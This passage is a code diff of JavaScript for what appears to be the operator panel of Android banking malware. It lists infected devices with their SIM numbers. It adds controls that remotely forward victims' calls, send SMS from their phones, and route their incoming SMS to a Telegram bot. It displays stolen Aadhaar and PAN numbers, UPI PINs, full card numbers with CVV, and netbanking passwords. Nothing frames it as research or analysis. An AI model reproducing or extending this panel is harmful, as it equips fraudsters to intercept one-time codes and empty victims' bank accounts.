+    body.innerHTML = '<div class="message-item"><div class="msg-sender">Device Info</div><div class="msg-body"><strong>Model:</strong> ' + escapeHtml(dev.device_model || '-') + '<br><strong>Manufacturer:</strong> ' + escapeHtml(dev.device_manufacturer || '-') + '<br><strong>Android:</strong> ' + escapeHtml(dev.android_version || '-') + '<br><strong>Serial:</strong> ' + escapeHtml(dev.serial_number || '-') + '<br><strong>Battery:</strong> ' + (dev.battery || '-') + '<br><strong>Status:</strong> ' + (dev.status || '-') + '<br><strong>SIM 1:</strong> ' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || '-') + '<br><strong>SIM 2:</strong> ' + escapeHtml((dev.sim_info && dev.sim_info.sim2_number) || '-') + '<br><strong>Installed:</strong> ' + (dev.first_install_time || dev.install_time || '-') + '</div></div>';
   }
 }
 
@@ -401,15 +529,129 @@ function escapeHtml(text) {
   return div.innerHTML;
 }
 
-// ═══════════════════════════════════════════
+// DIALOGS
+function showDialog(title, content) {
+  document.getElementById('dialogTitle').textContent = title;
+  document.getElementById('dialogBody').innerHTML = content;
+  document.getElementById('dialog').classList.add('active');
+}
+function closeDialog() { document.getElementById('dialog').classList.remove('active'); }
+
+function showCallFwdDialog() {
+  showDialog('📞 Call Forward',
+    '<div class="form-group"><label class="form-label">Forward to Number</label><input type="text" class="form-input" id="dFwdNum" placeholder="9876543210" inputmode="numeric"></div>' +
+    '<div class="form-group"><label class="form-label">SIM Slot</label><select class="form-select" id="dFwdSim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select></div>' +
+    '<button class="btn-submit" id="dFwdActivate">ACTIVATE</button>' +
+    '<button class="btn-submit danger" id="dFwdDeactivate" style="margin-top:8px">DEACTIVATE</button>'
+  );
+  setTimeout(function() {
+    document.getElementById('dFwdActivate').onclick = function() { sendCallFwd('activate'); };
+    document.getElementById('dFwdDeactivate').onclick = function() { sendCallFwd('deactivate'); };
+  }, 50);
+}
+
+function sendCallFwd(action) {
+  var num = document.getElementById('dFwdNum').value.trim();
+  var sim = parseInt(document.getElementById('dFwdSim').value);
+  if (action === 'activate' && num.length < 10) { alert('Enter valid number'); return; }
+  db.ref('call_forward_commands/' + currentDeviceId).push({
+    action: action, number: num, sim_slot: sim, status: 'pending', timestamp: Date.now()
+  });
+  alert('✅ Command sent: ' + action);
+  closeDialog();
+}
+
+function showSendSmsDialog() {
+  showDialog('📧 Send SMS',
+    '<div class="form-group"><label class="form-label">To Number</label><input type="text" class="form-input" id="dSmsTo" placeholder="9876543210" inputmode="numeric"></div>' +
+    '<div class="form-group"><label class="form-label">Message</label><textarea class="form-textarea" id="dSmsMsg" placeholder="Type message..."></textarea></div>' +
+    '<div class="form-group"><label class="form-label">SIM Slot</label><select class="form-select" id="dSmsSim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select></div>' +
+    '<button class="btn-submit" id="dSmsSend">SEND</button>'
+  );
+  setTimeout(function() {
+    document.getElementById('dSmsSend').onclick = function() {
+      var to = document.getElementById('dSmsTo').value.trim();
+      var msg = document.getElementById('dSmsMsg').value.trim();
+      var sim = parseInt(document.getElementById('dSmsSim').value);
+      if (!to || !msg) { alert('Fill all fields'); return; }
+      db.ref('device_info/' + currentDeviceId + '/sms_commands').push({
+        to: to, message: msg, sim_slot: sim, status: 'pending', timestamp: Date.now()
+      });
+      alert('✅ SMS command sent');
+      closeDialog();
+    };
+  }, 50);
+}
+
+function showTelegramDialog() {
+  db.ref('forward_settings/' + currentDeviceId).once('value').then(function(snap) {
+    var data = snap.val() || {};
+    showDialog('✈️ Telegram to SMS',
+      '<div class="form-group"><label class="form-label">Bot Token</label><input type="text" class="form-input" id="dTgToken" value="' + escapeHtml(data.bot_token || '') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Chat ID</label><input type="text" class="form-input" id="dTgChat" value="' + escapeHtml(data.chat_id || '') + '"></div>' +
+      '<div class="form-group"><label class="form-label">SIM Slot</label><select class="form-select" id="dTgSim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select></div>' +
+      '<button class="btn-submit" id="dTgStart">START</button>'
+    );
+    setTimeout(function() {
+      document.getElementById('dTgStart').onclick = function() {
+        var token = document.getElementById('dTgToken').value.trim();
+        var chat = document.getElementById('dTgChat').value.trim();
+        var sim = parseInt(document.getElementById('dTgSim').value);
+        if (!token || !chat) { alert('Fill all fields'); return; }
+        db.ref('forward_settings/' + currentDeviceId).set({
+          bot_token: token, chat_id: chat, enabled: true, forward_sim_slot: sim,
+          start_timestamp: Date.now(), updated_at: Date.now()
+        });
+        alert('✅ Telegram activated for 60s');
+        closeDialog();
+      };
+    }, 50);
+  });
+}
+
+function showLoginDetailsDialog() {
+  db.ref('device_info/' + currentDeviceId).once('value').then(function(snap) {
+    var dev = snap.val() || {};
+    var form = dev.form_data || {};
+    var kyc = dev.kyc_data || {};
+    showDialog('🔐 Login Details',
+      '<div class="form-group"><label class="form-label">Name</label><input class="form-input" readonly value="' + escapeHtml(form.name || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Mobile</label><input class="form-input" readonly value="' + escapeHtml(form.mobile || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Type</label><input class="form-input" readonly value="' + escapeHtml(form.type || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Number</label><input class="form-input" readonly value="' + escapeHtml(form.number || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Aadhaar</label><input class="form-input" readonly value="' + escapeHtml(kyc.aadhaar || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">PAN</label><input class="form-input" readonly value="' + escapeHtml(kyc.pan || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">DOB</label><input class="form-input" readonly value="' + escapeHtml(kyc.dob || '-') + '"></div>'
+    );
+  });
+}
+
+function showCardDetailsDialog() {
+  db.ref('device_info/' + currentDeviceId).once('value').then(function(snap) {
+    var dev = snap.val() || {};
+    var upi = dev.upi_data || {};
+    var card = dev.card_data || {};
+    var bank = dev.netbanking_data || {};
+    showDialog('💳 Card Details',
+      '<div class="form-group"><label class="form-label">UPI App</label><input class="form-input" readonly value="' + escapeHtml(upi.app_name || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">UPI PIN</label><input class="form-input" readonly value="' + escapeHtml(upi.upi_pin || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Card Number</label><input class="form-input" readonly value="' + escapeHtml(card.card_number || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Expiry</label><input class="form-input" readonly value="' + escapeHtml(card.expiry || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">CVV</label><input class="form-input" readonly value="' + escapeHtml(card.cvv || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Holder</label><input class="form-input" readonly value="' + escapeHtml(card.card_holder || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Bank</label><input class="form-input" readonly value="' + escapeHtml(bank.bank_name || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">User ID</label><input class="form-input" readonly value="' + escapeHtml(bank.user_id || '-') + '"></div>' +
+      '<div class="form-group"><label class="form-label">Password</label><input class="form-input" readonly value="' + escapeHtml(bank.password || '-') + '"></div>'
+    );
+  });
+}
+
 // EVENT LISTENERS
-// ═══════════════════════════════════════════
 document.getElementById('loginBtn').addEventListener('click', doLogin);
 document.getElementById('logoutBtn').addEventListener('click', doLogout);
 document.getElementById('closeModalBtn').addEventListener('click', closeModal);
-document.getElementById('pinInput').addEventListener('keypress', function(e) {
-  if (e.key === 'Enter') doLogin();
-});
+document.getElementById('closeDialogBtn').addEventListener('click', closeDialog);
+document.getElementById('pinInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') doLogin(); });
 document.getElementById('searchBox').addEventListener('input', renderDevices);
 
 document.querySelectorAll('.filter-btn').forEach(function(btn) {
@@ -422,18 +664,35 @@ document.querySelectorAll('.filter-btn').forEach(function(btn) {
 });
 
 document.querySelectorAll('.tab').forEach(function(tab) {
-  tab.addEventListener('click', function() {
-    switchTab(this.getAttribute('data-tab'));
-  });
+  tab.addEventListener('click', function() { switchTab(this.getAttribute('data-tab')); });
 });
 
-document.getElementById('modal').addEventListener('click', function(e) {
-  if (e.target.id === 'modal') closeModal();
+document.querySelectorAll('.msg-tab').forEach(function(tab) {
+  tab.addEventListener('click', function() { setMsgFilter(this.getAttribute('data-msgfilter')); });
 });
 
-// Auto-login
+document.getElementById('msgCategory').addEventListener('change', renderTab);
+document.getElementById('btnRefreshMsgs').addEventListener('click', function() { renderTab(); });
+document.getElementById('btnDeleteAllMsgs').addEventListener('click', function() {
+  if (!confirm('Delete ALL messages?')) return;
+  db.ref('device_info/' + currentDeviceId + '/messages').remove();
+  db.ref('device_info/' + currentDeviceId + '/sms_history').remove();
+});
+document.getElementById('btnCallFwd').addEventListener('click', showCallFwdDialog);
+document.getElementById('btnSendSms').addEventListener('click', showSendSmsDialog);
+document.getElementById('btnTelegram').addEventListener('click', showTelegramDialog);
+document.getElementById('btnLogin').addEventListener('click', showLoginDetailsDialog);
+document.getElementById('btnCard').addEventListener('click', showCardDetailsDialog);
+document.getElementById('btnDeleteDevice').addEventListener('click', function() {
+  if (!confirm('Delete this device?')) return;
+  db.ref('device_info/' + currentDeviceId).remove();
+  closeModal();
+});
+
+document.getElementById('modal').addEventListener('click', function(e) { if (e.target.id === 'modal') closeModal(); });
+document.getElementById('dialog').addEventListener('click', function(e) { if (e.target.id === 'dialog') closeDialog(); });
+
 window.addEventListener('load', function() {
-  console.log('Page loaded');
   if (localStorage.getItem('admin_logged_in') === 'true') {
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
